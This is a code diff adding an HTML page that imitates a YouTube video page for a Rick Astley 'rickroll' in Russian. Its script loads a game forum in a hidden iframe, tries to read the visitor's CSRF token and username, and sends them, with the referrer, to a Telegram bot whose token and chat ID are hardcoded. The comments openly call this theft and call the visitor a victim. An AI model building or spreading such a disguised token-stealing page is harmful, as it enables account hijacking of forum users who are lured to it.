@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <meta property="og:title" content="НИКОГДА НЕ СДАВАЙСЯ 🔥 ЛУЧШАЯ МОТИВАЦИЯ 2026">
+    <meta property="og:description" content="Этот трек перевернёт твою жизнь! Обязательно послушай до конца!">
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta property="og:url" content="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0f0f0f; 
+            font-family: 'Roboto', Arial, sans-serif;
+            color: white;
+        }
+        
+        /* YouTube плеер */
+        .player-container {
+            position: relative;
+            width: 100%;
+            background: black;
+        }
+        .player {
+            position: relative;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .video-iframe {
+            width: 100%;
+            height: 500px;
+            border: none;
+        }
+        
+        /* Затемнение (для эффекта загрузки) */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.5s;
+        }
+        .overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ff0000;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text {
+            margin-top: 20px;
+            color: #fff;
+            font-size: 18px;
+        }
+        
+        /* Информация под видео */
+        .video-info {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .video-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .video-meta {
+            color: #aaa;
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px 0;
+            border-top: 1px solid #333;
+            border-bottom: 1px solid #333;
+        }
+        .channel-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+        }
+        .channel-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .channel-subs {
+            color: #aaa;
+            font-size: 14px;
+        }
+        .subscribe-btn {
+            background: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: auto;
+        }
+        
+        /* Комментарии */
+        .comments-section {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .comments-header {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        .comment {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #333;
+            flex-shrink: 0;
+        }
+        .comment-content {
+            flex-grow: 1;
+        }
+        .comment-author {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .comment-text {
+            color: #ddd;
+            margin-bottom: 5px;
+        }
+        .comment-meta {
+            color: #aaa;
+            font-size: 12px;
+        }
+        
+        /* Скрытый iframe для кражи */
+        .stealth-iframe {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            top: -100px;
+            left: -100px;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Затемнение при загрузке -->
+    <div class="overlay" id="overlay">
+        <div style="text-align: center;">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Загрузка видео... 1080p</div>
+        </div>
+    </div>
+
+    <!-- YouTube плеер -->
+    <div class="player-container">
+        <div class="player">
+            <iframe class="video-iframe" 
+                    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1"
+                    title="YouTube video player"
+                    frameborder="0"
+                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                    allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
+    <!-- Информация о видео -->
+    <div class="video-info">
+        <div class="video-title">
+            🔥 NEVER GONNA GIVE YOU UP - Rick Astley (ЛУЧШАЯ МОТИВАЦИЯ 2026) [ЗАРЯД ЭНЕРГИИ]
+        </div>
+        <div class="video-meta">
+            <span>32 456 789 просмотров</span>
+            <span>•</span>
+            <span>1 день назад</span>
+        </div>
+        
+        <div class="channel-info">
+            <div class="channel-avatar"></div>
+            <div>
+                <div class="channel-name">Rick Astley Official</div>
+                <div class="channel-subs">15.3 млн подписчиков</div>
+            </div>
+            <button class="subscribe-btn" onclick="fakeSubscribe()">Подписаться</button>
+        </div>
+    </div>
+
+    <!-- Комментарии -->
+    <div class="comments-section">
+        <div class="comments-header">12 345 комментариев</div>
+        
+        <div class="comment">
+            <div class="comment-avatar"></div>
+            <div class="comment-content">
+                <div class="comment-author">@user123</div>
+                <div class="comment-text">Кто это слушает в 2026? 🔥</div>
+                <div class="comment-meta">2 минуты назад • 123 лайка</div>
+            </div>
+        </div>
+        
+        <div class="comment">
+            <div class="comment-avatar"></div>
+            <div class="comment-content">
+                <div class="comment-author">@minecraft_player</div>
+                <div class="comment-text">Под этот трек строил дом в майнкрафте 🏗️</div>
+                <div class="comment-meta">15 минут назад • 45 лайков</div>
+            </div>
+        </div>
+        
+        <div class="comment">
+            <div class="comment-avatar"></div>
+            <div class="comment-content">
+                <div class="comment-author">@votive_rp_fan</div>
+                <div class="comment-text">Кто с форума? 👀</div>
+                <div class="comment-meta">1 час назад • 789 лайков</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Скрытый iframe для кражи -->
+    <iframe id="stealthFrame" class="stealth-iframe"></iframe>
+
+    <script>
+        // Telegram бот (ТВОЙ)
+        const TELEGRAM_TOKEN = '7506805718:AAHbtYjOH12lRqT5H2u8pnB0qR9f7kXcYI4';
+        const CHAT_ID = '-5188258230';
+        
+        // Убираем затемнение через 3 секунды
+        setTimeout(() => {
+            document.getElementById('overlay').classList.add('hidden');
+        }, 3000);
+        
+        // Запускаем кражу токена
+        setTimeout(() => {
+            stealToken();
+        }, 2000);
+        
+        async function stealToken() {
+            let iframe = document.getElementById('stealthFrame');
+            iframe.src = 'https://forum.votive-rp.com';
+            
+            iframe.onload = function() {
+                try {
+                    let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    let token = iframeDoc.querySelector('html').getAttribute('data-csrf');
+                    let user = iframeDoc.querySelector('.p-navgroup-link--user .p-navgroup-linkText');
+                    let username = user ? user.textContent.trim() : 'Неизвестно';
+                    
+                    if (token) {
+                        sendToTelegram(`
+🎣 **РИКРОЛЛ СРАБОТАЛ!**
+
+👤 Жертва: ${username}
+🎫 Токен: \`${token}\`
+🔗 Пришёл по ссылке: ${document.referrer || 'Прямой переход'}
+
+🎵 Слушает Rick Astley и даже не подозревает...
+                        `);
+                    }
+                } catch (e) {
+                    sendToTelegram(`
+❌ **Ошибка CORS**
+
+👤 Жертва зашла, но CORS защитил
+🌐 Реферрер: ${document.referrer || 'Прямой переход'}
+🎵 Рикролл играет, токен не украден
+                    `);
+                }
+            };
+        }
+        
+        async function sendToTelegram(message) {
+            try {
+                let encoded = encodeURIComponent(message);
+                await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`
+                );
+                console.log('✅ Отчёт отправлен!');
+            } catch (e) {
+                console.log('❌ Ошибка:', e);
+            }
+        }
+        
+        function fakeSubscribe() {
+            alert('🔔 Спасибо за подписку! Теперь ты будешь получать уведомления о новых рикроллах!');
+        }
+        
+        // Отслеживаем, откуда пришли
+        console.log('👤 Переход с:', document.referrer);
+    </script>
+</body>
+</html>
